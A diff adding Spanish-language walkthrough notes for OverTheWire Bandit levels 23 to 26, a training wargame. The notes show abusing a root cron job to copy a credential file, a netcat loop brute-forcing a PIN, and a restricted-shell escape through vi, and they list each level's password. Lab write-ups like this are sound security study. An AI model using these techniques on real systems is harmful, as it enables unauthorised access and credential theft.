@@ -275,3 +275,61 @@ Nivel 22 - Nivel 23:
 	contraseña: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 8. Logout
 	
+Nivel 23 - Nivel 24:
+1. Iniciar sesión con el bandit 23:
+	ssh bandit.labs.overthewire.org -l bandit23 -p 2220
+2. Ejecutamos la instrucción que nos menciona OverTheWire "cd /etc/cron.d/".
+3. Ejecutmos "ls" para ver el contenido.
+	cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  popularity-contest
+4. Ejecutamos "cat cronjob_bandit24" y luego "cat /usr/bin/cronjob_bandit24.sh" por el archivo que indica.
+	#!/bin/bash
+
+	myname=$(whoami)
+
+	cd /var/spool/$myname
+	echo "Executing and deleting all scripts in /var/spool/$myname:"
+	for i in * .*;
+	do
+	    if [ "$i" != "." -a "$i" != ".." ];
+	    then
+		echo "Handling $i"
+		timeout -s 9 60 ./$i
+		rm -f ./$i
+	    fi
+	done
+5. Siguiendo la recomendación, creamos un script "mkdir /tmp/b23abc" "vim /tmp/b23abc/getpass.sh" con lo siguiente:
+	#!/bin/bash
+	cat /etc/bandit_pass/bandit24 > tmp/b23abc/pass.txt
+6. Damos permisos para poder copiar la información del archivo donde está la contraseña a donde nosotros queremos "chmod 777 /tmp/b23abc/getpass.sh" "chmod 777 /tmp/b23ac/".
+7. Hacemos la copia "cp /tmp/b23abc/getpass.sh /var/spool/bandit24/"
+8. Leemos el archivo con el password.
+	contraseña: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+Nivel 24 - Nivel 25
+1. Iniciar sesión con el bandit 24:
+	ssh bandit.labs.overthewire.org -l bandit24 -p 2220
+2. Creamos un script que pruebe todas las posibilidades de PIN para hallar la contraseña "mkdir /tmp/allan" "mkdir /tmp/allan" "vim script.sh".
+3. Ponemos un for para probar todo. Se intentó poner una condición de salida para cortar el lazo si se encontraba, pero se demoraba más.
+	#!/bin/bash
+	passwd="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+
+	for a in {0..9}{0..9}{0..9}{0..9}
+	do
+	    echo "PIN: $a"
+	    echo $passwd' '$a | nc localhost 30002 >> result &
+	    done
+4. Luego leemos el archivo donde se guardó para encontrar la contraseña.
+	contraseña: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Nivel 25 - Nivel 26
+1. Iniciar sesión con el bandit 25:
+	ssh bandit.labs.overthewire.org -l bandit25 -p 2220
+2. EJecutar el siguiente comando "ssh -i bandit26.sshkey bandit26@localhost"
+3. Leer los siguientes archivos "cat /etc/passwd | grep bandit26" "cat /usr/bin/showtext"
+4. Reducir el tamaño de la pantalla al mínimo y ejecutar "ssh -i bandit26.sshkey -t bandit26@localhost cat text.txt"
+5. Ejecutar el comando "v" y luego ":e /etc/bandit_pass/bandit26" y aparecerá la contraseña.
+	contraseña: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+Nivel 26 - Nivel 27
+NO EXISTE EL NIVEL SEGÚN OVERTHEWIRE
+
